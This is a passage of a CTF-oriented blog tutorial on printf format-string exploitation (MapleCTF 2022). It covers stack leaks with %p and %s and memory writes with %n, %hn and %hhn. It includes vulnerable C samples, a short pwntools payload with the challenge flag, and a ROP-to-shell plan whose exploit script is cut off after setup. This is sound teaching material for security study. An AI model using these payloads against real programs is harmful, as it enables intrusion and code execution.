@@ -1,0 +1,564 @@
+<!DOCTYPE html><html data-astro-transition-scope="astro-nfpogox7-1" lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/regular/font.css"><link rel="stylesheet" href="/fonts/maple-mono/normal-nl/bold/font.css"><link rel="icon" href="/favicon.ico?v=2" sizes="16x16 32x32 48x48"><link rel="icon" type="image/png" sizes="32x32" href="/icons/favicon-32.png?v=2"><link rel="icon" type="image/png" sizes="512x512" href="/icons/favicon.png?v=2"><link rel="apple-touch-icon" sizes="180x180" href="/icons/apple-touch-icon.png?v=2"><link rel="sitemap" href="/sitemap-index.xml"><link rel="alternate" type="application/rss+xml" title="Aynakeya" href="/rss.xml"><link rel="canonical" href="https://www.aynakeya.com/blog/posts/how-to-utilize-printf-in-pwn/"><meta name="generator" content="Astro v7.3.3"><title>[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022] | Aynakeya</title><meta name="description" content="0x0 Introductionprintf is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think "><meta property="og:type" content="article"><meta property="og:title" content="[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022] | Aynakeya"><meta property="og:description" content="0x0 Introductionprintf is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think "><meta property="og:url" content="https://www.aynakeya.com/blog/posts/how-to-utilize-printf-in-pwn/"><meta property="og:image" content="https://www.aynakeya.com/images/avatar.jpg"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022] | Aynakeya"><meta name="twitter:description" content="0x0 Introductionprintf is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think "><meta name="twitter:image" content="https://www.aynakeya.com/images/avatar.jpg"><script>
+  (() => {
+    function applyTheme() {
+      const savedTheme = localStorage.getItem('theme');
+      const themePreference = savedTheme === 'light' || savedTheme === 'dark' ? savedTheme : 'system';
+      document.documentElement.dataset.themePreference = themePreference;
+      document.documentElement.dataset.theme = themePreference === 'system'
+        ? (matchMedia('(prefers-color-scheme: dark)').matches ? 'dark' : 'light')
+        : themePreference;
+    }
+    applyTheme();
+    document.addEventListener('astro:after-swap', applyTheme);
+  })();
+</script><meta name="astro-view-transitions-enabled" content="true"><meta name="astro-view-transitions-fallback" content="swap"><script type="module" src="/_astro/ClientRouter.astro_astro_type_script_index_0_lang.CYDbzu1r.js"></script><link rel="stylesheet" href="/_astro/BaseLayout.CjWOxd-i.css"><link rel="stylesheet" href="/_astro/katex.DM9nOOGm.css"><style>[data-astro-transition-scope="astro-nfpogox7-1"] { view-transition-name: astro-nfpogox7-1; }@layer astro { ::view-transition-old(astro-nfpogox7-1) { animation: none; opacity: 0; mix-blend-mode: normal; }::view-transition-new(astro-nfpogox7-1) { animation: none; mix-blend-mode: normal; }::view-transition-group(astro-nfpogox7-1) { animation: none } }[data-astro-transition-fallback="old"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="old"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }[data-astro-transition-fallback="new"] [data-astro-transition-scope="astro-nfpogox7-1"],
+			[data-astro-transition-fallback="new"][data-astro-transition-scope="astro-nfpogox7-1"] { animation: none; mix-blend-mode: normal; }</style></head><body id="top"><a class="skip-link" href="#content">Skip to content</a><header class="site-header"><div class="header-inner"><a class="brand" href="/" aria-label="Aynakeya home"><img src="/icons/favicon.png" alt="" width="32" height="32"><span>Aynakeya</span></a><nav class="site-nav" aria-label="Main navigation"><a href="/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="m3 10 9-7 9 7M5 9v11h5v-6h4v6h5V9"></path></svg><span>Home</span></a><a href="/blog/" aria-current="page"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M14 4H5v16h14v-9M9 15l1-4L19 2l3 3-9 9-4 1Z"></path></svg><span>Writing</span></a><a href="/bookmarks/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M6 3h12v18l-6-4-6 4V3Z"></path></svg><span>Bookmarks</span></a><a href="/ctf-writeup/"><svg class="icon" width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 3h18v5H3V3ZM5 8v13h14V8M10 12h4"></path></svg><span>CTF</span></a></nav><div class="header-tools"><a class="icon-button" href="/search/" aria-label="搜索文章与 CTF 归档" title="搜索文章与 CTF 归档"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 21l-5-5M18 10a8 8 0 1 1-16 0 8 8 0 0 1 16 0Z"></path></svg></a><button class="icon-button" id="theme-toggle" type="button" aria-label="当前：跟随系统；切换到浅色模式" title="当前：跟随系统；切换到浅色模式"><span data-theme-icon="light" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M12 2v2m0 16v2M2 12h2m16 0h2M5 5l1.5 1.5m11 11L19 19M5 19l1.5-1.5m11-11L19 5M17 12a5 5 0 1 1-10 0 5 5 0 0 1 10 0Z"></path></svg></span><span data-theme-icon="dark" hidden><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M20.9 13A9 9 0 0 1 11 3.1 9 9 0 1 0 20.9 13Z"></path></svg></span><span data-theme-icon="system"><svg class="icon" width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.6" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M3 4h18v13H3V4ZM12 17v4M8 21h8"></path></svg></span></button></div></div></header><script type="module">var e=document.documentElement,t=matchMedia(`(prefers-color-scheme: dark)`),n={light:{label:`浅色模式`,next:`dark`},dark:{label:`深色模式`,next:`system`},system:{label:`跟随系统`,next:`light`}};function r(){let r=e.dataset.themePreference;e.dataset.theme=r===`system`?t.matches?`dark`:`light`:r;let i=document.querySelector(`#theme-toggle`),a=i.querySelectorAll(`[data-theme-icon]`),o=n[r],s=`当前：${o.label}；切换到${n[o.next].label}`;i.setAttribute(`aria-label`,s),i.title=s,a.forEach(e=>{e.hidden=e.dataset.themeIcon!==r})}r(),document.addEventListener(`astro:after-swap`,r),document.addEventListener(`click`,t=>{if(!(t.target instanceof Element)||!t.target.closest(`#theme-toggle`))return;let i=n[e.dataset.themePreference].next;e.dataset.themePreference=i,localStorage.setItem(`theme`,i),r()}),t.addEventListener(`change`,()=>{e.dataset.themePreference===`system`&&r()});</script><div class="site-shell"><aside class="site-sidebar" aria-label="个人信息与文章目录"><section class="profile-card panel" aria-label="About Aynakeya"><a class="profile-avatar" href="/" aria-label="Aynakeya home"><img src="/images/avatar.jpg" alt="Aynakeya 的头像" width="208" height="208"></a><div class="profile-identity"><p class="profile-name">Aynakeya</p><p class="profile-interests">相信的心就是你的魔法</p><div class="social-links"><a href="https://github.com/aynakeya">GitHub</a><a href="mailto:aynakeya.official@gmail.com">Email</a><a href="https://space.bilibili.com/10003632">Bilibili</a></div></div><div class="site-stats"><a href="/blog/archives/"><strong>121</strong><span>文章</span></a><a href="/blog/categories/"><strong>16</strong><span>分类</span></a><a href="/blog/tags/"><strong>101</strong><span>标签</span></a></div></section><details class="toc" open><summary>文章目录</summary><nav aria-label="Table of contents"><ol><li style="--depth: 0"><a href="#0x0-introduction">0x0 Introduction</a></li><li style="--depth: 0"><a href="#0x1-what-is-printf-string-formating">0x1 What is printf (string formating)</a></li><li style="--depth: 0"><a href="#0x2-how-function-are-called">0x2 How function are called</a></li><li style="--depth: 0"><a href="#0x2-read-the-stack">0x2 Read the stack</a></li><li style="--depth: 1"><a href="#basic-idea">basic idea</a></li><li style="--depth: 1"><a href="#verification">verification</a></li><li style="--depth: 1"><a href="#simpler-method">simpler method</a></li><li style="--depth: 0"><a href="#0x3-write-on-the-stack">0x3 Write on the stack</a></li><li style="--depth: 1"><a href="#basic-idea-1">basic idea</a></li><li style="--depth: 1"><a href="#example">example</a></li><li style="--depth: 1"><a href="#n-hn-hhn">%n? %hn? %hhn</a></li><li style="--depth: 0"><a href="#0x4-example-baby-pwintf">0x4 Example baby-pwintf</a></li><li style="--depth: 0"><a href="#0x4-example-pwintf">0x4 Example pwintf</a></li><li style="--depth: 1"><a href="#mitigation">Mitigation</a></li><li style="--depth: 1"><a href="#quick-look">Quick look</a></li><li style="--depth: 1"><a href="#change-rip-of-printf-unintended">change rip of printf (unintended)</a></li><li style="--depth: 2"><a href="#exploitpy">exploit.py</a></li><li style="--depth: 1"><a href="#write-rop-to-chain-to-free_hook-intended-solution">write rop to chain to free_hook (intended solution)</a></li><li style="--depth: 2"><a href="#exploitpy-1">exploit.py</a></li><li style="--depth: 1"><a href="#flag">flag</a></li></ol></nav></details><script type="module">var e=matchMedia(`(max-width: 800px)`);function t(){let t=document.querySelector(`.toc`);t&&(t.open=!e.matches)}t(),document.addEventListener(`astro:after-swap`,t),e.addEventListener(`change`,t);</script></aside><div class="site-main"><main id="content" tabindex="-1"><article class="paper article-page"><header class="post-header"><a class="eyebrow" href="/blog/">&larr; 返回文章列表</a><h1>[pwn] Printf stuff in pwn (e.g. pwintf) [MapleCTF2022]</h1><div class="post-meta"><time datetime="2022-02-02T05:14:47.000Z">2022-02-02</time><a href="/blog/categories/ctf/">CTF</a></div></header><div class="prose"><p><a id="0x0-Introduction"></a></p>
+<h1 id="0x0-introduction">0x0 Introduction</h1>
+<p><strong>printf</strong> is a common vulnerable in the pwn questions. Recently, I got an opportunity to try two very interesting question related to printf in MapleCTF 2022, I think it would be good if I wrote my experience about printf so that I could reinforce my understanding about printf stuff.</p>
+<p>Anyway, I would try to explain as much as detail in the article in order to make it beginner friendly.</p>
+<p>Hope this article can help you in printf</p>
+<p><a id="0x1-What-is-printf-string-formating"></a></p>
+<h1 id="0x1-what-is-printf-string-formating">0x1 What is printf (string formating)</h1>
+<p>so, string format is a way to print out data by stating its format in a string.</p>
+<p>for example, the code below will print out <strong>"Hello, printf , I'm 16 year old"</strong>. We can see that string "%s" is replace by "printf" and "%d" is replaced by 0x10 (which is 16 in decimal)</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>printf("Hello, %s , I'm %d year old","printf",0x10)</span></span></code></pre>
+<p>all the character start with <strong>%</strong> is called <strong>format string</strong>, there are serveral different format string you can use in C.</p>
+<p>Here is some commonly used format string, ignore <code>%n</code> for now. We will come to it later</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>%d      integer</span></span>
+<span class="line"><span>%s      char</span></span>
+<span class="line"><span>%l      long int</span></span>
+<span class="line"><span>%ll     long long int</span></span>
+<span class="line"><span>%p      pointer </span></span>
+<span class="line"><span>%x      unsigned hexadecimal</span></span>
+<span class="line"><span>%n      write number of printed character in 4 byte</span></span>
+<span class="line"><span>%hn     write number of printed character in 2 byte</span></span>
+<span class="line"><span>%hhn    write number of printed character in 1 byte</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>%10$?   use 10th parameter and print in format of ?</span></span></code></pre>
+<p><a id="0x2-How-function-are-called"></a></p>
+<h1 id="0x2-how-function-are-called">0x2 How function are called</h1>
+<p>Before talking about the printf, first thing we need to know is how a function are called and how parameter are passed.</p>
+<p>In one words, x86 push all parameter into the stack. x64 move first 6 parameter into register and push rest parameters in to the stack.</p>
+<p>for example</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>bar(100,200)</span></span></code></pre>
+<p>In <strong>x86</strong>, the stack would look like this</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Bar Stack (current)</span></span>
+<span class="line"><span>EBP</span></span>
+<span class="line"><span>EIP</span></span>
+<span class="line"><span>200 - para2</span></span>
+<span class="line"><span>100 - para1</span></span>
+<span class="line"><span>Pararent Stack</span></span></code></pre>
+<p>While in <strong>x64</strong>, the stack would look like this and two paramter, 100 is saved in the <code>rdi</code> and 200 is saved in the <code>rsi</code>. Since there there are only two argument, there is no extra value pushed into the stack.</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>Bar Stack (current)</span></span>
+<span class="line"><span>RBP</span></span>
+<span class="line"><span>RIP</span></span>
+<span class="line"><span>Pararent Stack</span></span></code></pre>
+<p><img alt="2022-02-02_192750.jpg" loading="lazy" decoding="async" width="1105" height="511" src="/_astro/2022-02-02_192750.Ayp16GLX_Z2e0qfT.webp"></p>
+<p><a id="0x2-Read-the-stack"></a></p>
+<h1 id="0x2-read-the-stack">0x2 Read the stack</h1>
+<h2 id="basic-idea">basic idea</h2>
+<p>Here is a simple vulnerable code, can you figure out a way to let program print out <code>*buf</code>.</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#include &#x3C;stdio.h></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>void main()</span></span>
+<span class="line"><span>{</span></span>
+<span class="line"><span>  int x = 0x1337;</span></span>
+<span class="line"><span>  char *buf = "my super secret";</span></span>
+<span class="line"><span>  char s[0x20];</span></span>
+<span class="line"><span>  printf("hello here is my number %d\n", x);</span></span>
+<span class="line"><span>  while (1)</span></span>
+<span class="line"><span>  {</span></span>
+<span class="line"><span>    puts("please enter: ");</span></span>
+<span class="line"><span>    fgets(s, 0x20, stdin);</span></span>
+<span class="line"><span>    puts("You Enter: ");</span></span>
+<span class="line"><span>    printf(s); //!! here</span></span>
+<span class="line"><span>  }</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p><code>printf(s)</code> give us the opportunity. As I mentioned in the Part1, the computer didn't care about what parameter you actually pass in. It read whatever is in the register and on the stack.</p>
+<p>Assume you put <code>%p-%p-%p-%p</code> in the string <code>s</code>. The computer don't know you didn't pass other 4 parameter. It will just read whatever is store in the register and stack.</p>
+<p>For example ,in x64, it will print out address in <code>"rsi-rdx-rcx-r8"</code>.</p>
+<p>So, if we continue to print out, and used out all the 6 register. printf will assume there is some data in the stack, so printf will then get data from stack and print it out.</p>
+<p>This give us a way off leaking data on the stack.</p>
+<h2 id="verification">verification</h2>
+<p>Lets check with a debugger.</p>
+<p>First before call <code>printf</code>, the stack looks like this, we can see our <code>x</code> is at rsp, and <code>buf</code> is locate right under rsp.
+<img alt="2022-02-02_205224.jpg" loading="lazy" decoding="async" width="1772" height="226" src="/_astro/2022-02-02_205224.BjoQJgj2_Be2Jo.webp"></p>
+<p>Lets enter <code>%p%p%p%p%p %p-%s</code>.</p>
+<ul>
+<li>The first 5 <code>%p</code> is used for the rest of 5 registers</li>
+<li>than <code>x</code> and <code>buf</code> is printed by by format <code>%p</code> and <code>%s</code></li>
+</ul>
+<p>We got exactly what we want
+<img alt="2022-02-02_205732.jpg" loading="lazy" decoding="async" width="711" height="136" src="/_astro/2022-02-02_205732.BH7B6KWK_e3QsC.webp"></p>
+<p>we can also use <code>%p%p%p%p%p %p-%p</code> to print out the address of <code>buf</code></p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>You Enter:</span></span>
+<span class="line"><span>0x56206ad2e2a0(nil)0x7fdee909b1e70xc(nil) 0x1337-0x562069b06004</span></span></code></pre>
+<h2 id="simpler-method">simpler method</h2>
+<p>using <code>%p%p%p%p%p %p-%p</code> is ok when we have large input size. But what happen if we don't have enough input size.</p>
+<p>We can use <code>%num$format</code> to get the same result.</p>
+<p>for example, we want to get the <code>x</code> and <code>buf</code>. We know from previous, we can get x from 6th parameter and buf from 7th parameter.</p>
+<p>so, we can use <code>%6$p-%7$s</code> as a substitution. And we got the same result as <code>%p%p%p%p%p %p-%s</code></p>
+<p><img alt="2022-02-02_225614.jpg" loading="lazy" decoding="async" width="340" height="98" src="/_astro/2022-02-02_225614.Dtj9pVDq_1bYB0t.webp"></p>
+<p><a id="0x3-Write-on-the-stack"></a></p>
+<h1 id="0x3-write-on-the-stack">0x3 Write on the stack</h1>
+<h2 id="basic-idea-1">basic idea</h2>
+<p>in order to write data by printf, We need use the <strong>debug features</strong> of printf - <code>%n</code>, <code>%hn</code>, and <code>%hhn</code>.</p>
+<p>basicly, <code>%n</code> allow you write <strong>total number of character printed</strong> into a int pointer.</p>
+<p>For example, following code will change x to 5 after printf.</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#include &#x3C;stdio.h></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>void main()</span></span>
+<span class="line"><span>{</span></span>
+<span class="line"><span>  int x = 0;</span></span>
+<span class="line"><span>  printf("before, x = %d\n",x); // here x = 0</span></span>
+<span class="line"><span>  printf("12345%n\n",&#x26;x);</span></span>
+<span class="line"><span>  printf("after, x = %d\n",x); // this will print x = 5</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<h2 id="example">example</h2>
+<p>lets modify the example in the read. In this example, we need to find a way changing x to 0x1337.</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#include &#x3C;stdio.h></span></span>
+<span class="line"><span>#include &#x3C;stdlib.h></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>char *buf = "my super secret";</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>void main()</span></span>
+<span class="line"><span>{</span></span>
+<span class="line"><span>  int *x = malloc(sizeof(int));</span></span>
+<span class="line"><span>  *x = 0x1336;</span></span>
+<span class="line"><span>  char s[0x20];</span></span>
+<span class="line"><span>  while (1)</span></span>
+<span class="line"><span>  {</span></span>
+<span class="line"><span>    printf("hello here is my number 0x%x\n", *x);</span></span>
+<span class="line"><span>    puts("please enter: ");</span></span>
+<span class="line"><span>    fgets(s, 0x20, stdin);</span></span>
+<span class="line"><span>    puts("You Enter: ");</span></span>
+<span class="line"><span>    printf(s);</span></span>
+<span class="line"><span>    if (*x == 0x1337){</span></span>
+<span class="line"><span>      puts(buf);</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>  }</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>Looking at this code, we can use again <code>printf(s)</code> to change value store in the *x.</p>
+<p>Since x is locate under the rsp if we check the debugger, we can use <code>%7$n</code> format string to point to the x.</p>
+<p><img alt="2022-02-02_230122.jpg" loading="lazy" decoding="async" width="968" height="231" src="/_astro/2022-02-02_230122.NJ6cpV9i_2fYTSv.webp"></p>
+<p>then we use <code>%4919x%7$n</code> to write 0x1337 (4919) into x. (<code>%4919x</code> means pad 4919 byte, which has 4919 length)</p>
+<p>we can see the value of x has been successfully changed.</p>
+<p><img alt="2022-02-02_230645.jpg" loading="lazy" decoding="async" width="375" height="59" src="/_astro/2022-02-02_230645.Dg8gRIzn_1PO71l.webp"></p>
+<h2 id="n-hn-hhn">%n? %hn? %hhn</h2>
+<p>we know that the different between them is how many bytes it write.</p>
+<p>Normally, we only use <code>%hn</code> and <code>%hhn</code>.</p>
+<p>Because four bytes like 0x11ffff = 1179647 is too <strong>large</strong> for stdout to write.</p>
+<p>if we take the example above and change some value</p>
+<ul>
+<li>if x = 0xffffffff, use <code>%1x%7$hn</code>, x will become 0xffff0001 (two bytes have been overwrited)</li>
+<li>if x = 0xffffffff, use <code>%1x%7$hhn</code>, x will become 0xffffff01 (one bytes have been overwrited)</li>
+</ul>
+<p><strong>What if I wants to write more than 2 bytes</strong></p>
+<p>For example, if we want to write 4 bytes (0x1011) at address 0x1002</p>
+<ul>
+<li>first write lower two bytes 0x11 at 0x1002</li>
+<li>second write higher two bytes 0x10 at 0x1004</li>
+<li>depending on the endianness, if computer use big endianness, this should be write at 0x1000</li>
+</ul>
+<p><a id="0x4-Example-baby-pwintf"></a></p>
+<h1 id="0x4-example-baby-pwintf">0x4 Example baby-pwintf</h1>
+<p>Lets take look at source code <a href="./files/baby-pwintf.c">baby-pwintf.c</a></p>
+<p>the vulnerability is quite obvious if you read through the whole article.</p>
+<p>We just need change rating to 0x1337.</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>void vuln() {</span></span>
+<span class="line"><span>    char* input = malloc(16);</span></span>
+<span class="line"><span>    int* rating = malloc(4);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    fgets(input, 16, stdin);</span></span>
+<span class="line"><span>    *rating = input[0] % 11;</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    puts("Your name is:");</span></span>
+<span class="line"><span>    printf(input);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    printf("I rate your name %d / 10\n", *rating);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    if (*rating == 0x1337) {</span></span>
+<span class="line"><span>        puts("Nice name! here's a flag:");</span></span>
+<span class="line"><span>        win();</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>}</span></span></code></pre>
+<p>part of exp.py</p>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>io = start()</span></span>
+<span class="line"><span># 0x1337 = 4919</span></span>
+<span class="line"><span>io.sendlineafter(b"Tell me your name and I'll rate it!", b"%4919x%7$n")</span></span>
+<span class="line"><span>io.interactive()</span></span></code></pre>
+<p><strong>flag</strong>: maple{youwe_weady_fow_the_big_boy_chawwenge}</p>
+<p><a id="0x4-Example-pwintf"></a></p>
+<h1 id="0x4-example-pwintf">0x4 Example pwintf</h1>
+<p>Now, we understand the basic of printf. Lets do some challenge</p>
+<p><a id="Mitigation"></a></p>
+<h2 id="mitigation">Mitigation</h2>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#    Arch:     amd64-64-little</span></span>
+<span class="line"><span>#    RELRO:    Full RELRO</span></span>
+<span class="line"><span>#    Stack:    No canary found</span></span>
+<span class="line"><span>#    NX:       NX enabled</span></span>
+<span class="line"><span>#    PIE:      PIE enabled</span></span></code></pre>
+<p><a id="Quick-look"></a></p>
+<h2 id="quick-look">Quick look</h2>
+<p>lets take a quick look at the source code. There is a trivial vulnerability here - <code>printf(input)</code>.</p>
+<p>Before exploit the binary, there still some problem we need to find solution</p>
+<ol>
+<li>Since the input is locate at heap. We can't write arbitrary data into the stack.</li>
+<li>the program didn't provide a way to exist the while loop. And there is no ret instruction in the vuln function</li>
+</ol>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>#include &#x3C;stdio.h></span></span>
+<span class="line"><span>#include &#x3C;stdlib.h></span></span>
+<span class="line"><span>#include &#x3C;unistd.h></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>void vuln() {</span></span>
+<span class="line"><span>    puts("Wewcome b-back?!! Peopwe wewe t-twying t-to hack my pwogwam, so I stopped putting the x3 fwag in memowy ÚwÚ");</span></span>
+<span class="line"><span>    while(1) {</span></span>
+<span class="line"><span>        char* input = malloc(0x100);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        fgets(input, 0x100, stdin);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        printf(input);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>        free(input);</span></span>
+<span class="line"><span>    }</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>int main() {</span></span>
+<span class="line"><span>    alarm(60);</span></span>
+<span class="line"><span>    setbuf(stdout, NULL);</span></span>
+<span class="line"><span>    setbuf(stdin, NULL);</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    vuln();</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    return 0;</span></span>
+<span class="line"><span>}</span></span>
+<span class="line"><span></span></span></code></pre>
+<p>So, want can we do. There are two solution (maybe there is more but I only know two)</p>
+<ol>
+<li>change the rip of printf and then construct a rop chain to call one gadget</li>
+<li>write rop chain to free_hook</li>
+</ol>
+<h2 id="change-rip-of-printf-unintended">change rip of printf (unintended)</h2>
+<p>if we look at the stack before call program call printf. We can see that the address of printf rip is just 8 bytes above the vuln stack.</p>
+<p><img alt="2022-02-03_170338.jpg" loading="lazy" decoding="async" width="1828" height="325" src="/_astro/2022-02-03_170338.DDXLG0VM_Z1fTNYj.webp"></p>
+<p>So, if we can find a way to overwrite this rip, we can use this rip to construct a rop chain.</p>
+<p>Lets summarize the idea of this method</p>
+<ol>
+<li>first, find a memory block in the stack, make that block point to the rip of printf</li>
+<li>use printf with %n, change the address of rip</li>
+<li>when printf finish. It will fall into the rop chain and spawn a shell.</li>
+</ol>
+<p>With these step in mind, After looking at the stack, I came up with a solution.</p>
+<p><em>because i'm lazy, so i choose the address on the stack so that I only need to write at most 4 bytes</em></p>
+<ol>
+<li>change the value of (rsp+35*0x8) to (rsp + 5*0x8) using (rsp + 7*0x8)</li>
+<li>change the value of (rsp+5*0x8) to one gadget address using (rsp+35*0x8)</li>
+<li>change the value of (rsp+35*0x8) to (rsp - 0x8) using (rsp + 7*0x8)</li>
+<li>change the value of (rsp - 0x8) to rop chain gadget address using (rsp+35*0x8)</li>
+<li>use pop_rbp_r12_r13_r14_r15_ret as the the rop chain gadget, pop all unnecessary value on the stack and return to one gadget address in (rsp+5*0x8)</li>
+</ol>
+<p><a id="exploit-py"></a></p>
+<h3 id="exploitpy">exploit.py</h3>
+<pre class="astro-code astro-code-themes github-light github-dark" style="background-color:#fff;--shiki-dark-bg:#24292e;color:#24292e;--shiki-dark:#e1e4e8; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;" tabindex="0" data-language="plaintext"><code><span class="line"><span>from pwn import *</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>class BinaryInfo:</span></span>
+<span class="line"><span>    exe = "pwintf"</span></span>
+<span class="line"><span>    libc = "libc.so.6"</span></span>
+<span class="line"><span>    # libc = "/usr/lib/x86_64-linux-gnu/libc-2.31.so"</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span>    host = ""</span></span>
+<span class="line"><span>    port = 32011</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Set up pwntools for the correct architecture</span></span>
+<span class="line"><span>exe = context.binary = ELF(BinaryInfo.exe)</span></span>
+<span class="line"><span>exe_rop = ROP(exe)</span></span>
+<span class="line"><span>if BinaryInfo.libc != "":</span></span>
+<span class="line"><span>    libc = ELF(BinaryInfo.libc)</span></span>
+<span class="line"><span>    libc_rop = ROP(libc)</span></span>
+<span class="line"><span>else:</span></span>
+<span class="line"><span>    libc = None</span></span>
+<span class="line"><span>    libc_rop = None</span></span>
+<span class="line"><span></span></span>
+<span class="line"><span></span></span>
+<span class="line"><span># Many built-in settings can be controlled on the command-line and show up</span></span>
+<span class="line"><span># in "args".  For example, to dump all data sent/received, and disable ASLR</span></span>
